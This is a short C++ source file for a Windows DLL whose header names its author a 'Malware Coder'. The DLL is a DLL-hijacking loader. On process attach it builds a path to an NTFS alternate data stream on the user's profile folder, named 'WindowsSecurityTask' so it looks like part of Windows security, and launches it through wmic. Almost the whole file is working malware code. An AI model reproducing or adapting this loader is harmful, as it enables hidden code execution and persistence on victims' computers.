/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "pch.h"

std::string GetMyName()
{
    char username[256 + 1];
    DWORD username_len = 256 + 1;

    GetUserNameA(username, &username_len);
    return username;
}

void StartProgram()
{
    std::string path = "C:\\Users\\" + GetMyName() + ":WindowsSecurityTask";

    system(("wmic process call create " + path).c_str());
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        StartProgram();
        // MessageBoxA(NULL, "Hello World", "DLL Hijacking Test", NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}